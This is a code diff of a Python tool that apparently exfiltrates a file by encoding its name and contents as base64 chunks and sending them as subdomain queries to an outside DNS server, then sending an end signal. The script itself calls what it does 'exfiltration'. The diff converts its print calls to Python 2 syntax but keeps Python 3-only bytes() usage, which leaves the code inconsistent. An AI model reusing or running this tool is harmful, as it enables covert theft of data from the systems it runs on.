@@ -16,7 +16,7 @@ def send_to_server(resolver, data, server, timeout):
 		try:
 			time.sleep(timeout)
 			query = str(chunk) + "." + domain
-			print("==> " + server + ":" + query)
+			print "==> " + server + ":" + query
 			a = resolver.resolve(query, 'A')
 			#for i in a.response.answer:
 			#	for j in i.items:
@@ -25,8 +25,8 @@ def send_to_server(resolver, data, server, timeout):
 		except dns.exception.Timeout as e1:
 			print("TIMEOUT")
 		except KeyboardInterrupt as e:
-			print()
-			print("----------------------------------------------")
+			print ""
+			print "----------------------------------------------"
 			sys.exit("Terminating exfiltration")
 		except Exception as e2:
 			pass
@@ -74,24 +74,24 @@ chunks = len(splitted)
 # Instantiate new resolver
 resolver = dns.resolver.Resolver()
 resolver.nameservers = [server]
-print("----------------------------------------------")
-print("+ DNS Resolver:   " + server)
-print("+ Chunks to Send: " + str(chunks))
-print("+ Estimated Time: " + "about " + str((timeout + 2)*chunks) + " seconds")
-print("+ Starting Time:  " + datetime.now().strftime("%Y/%m/%d %H:%M:%S"))
-print("----------------------------------------------")
+print "----------------------------------------------"
+print "+ DNS Resolver:   " + server
+print "+ Chunks to Send: " + str(chunks)
+print "+ Estimated Time: " + "about " + str((timeout + 2)*chunks) + " seconds"
+print "+ Starting Time:  " + datetime.now().strftime("%Y/%m/%d %H:%M:%S")
+print "----------------------------------------------"
 
 # Before chunks, send filename
-print("+ Sending filename: " + filename)
+print "+ Sending filename: " + filename
 send_to_server(resolver, fn_splitted, server, timeout)
 
 # for every chunk, ask the server for resolution of <chunk>.<domain> as if <chunk> were the third level domain of the main one
-print("+ Sending file content of " + file)
+print "+ Sending file content of " + file
 send_to_server(resolver, splitted, server, timeout)
 
 # Send queries for file end
-print("+ Sending file END signal")
+print "+ Sending file END signal"
 send_to_server(resolver, [base64.b64encode(bytes("/end/", 'UTF-8')).decode() + "." + domain], server, timeout)
 
-print("----------------------------------------------")
-print("File " + file + " succesfully sent")
+print "----------------------------------------------"
+print "File " + file + " succesfully sent"
